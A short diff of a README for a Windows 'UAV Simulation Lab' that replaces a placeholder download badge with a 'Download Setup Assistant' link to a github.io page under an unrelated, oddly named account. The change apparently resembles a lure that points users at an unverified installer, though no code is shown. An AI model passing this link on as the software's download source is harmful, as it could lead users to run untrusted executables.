@@ -1,12 +1,6 @@
 <h1 align="center">🛩️ UAV Simulation Lab (Windows)</h1>
 
-<p align="center">
-  <a href="YOUR_DOWNLOAD_LINK_HERE" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20UAV%20Simulation%20Lab-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download UAV Simulation Lab for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://gcateenlolu.github.io/.github/uav-simulator-lab)
 
 ---
 
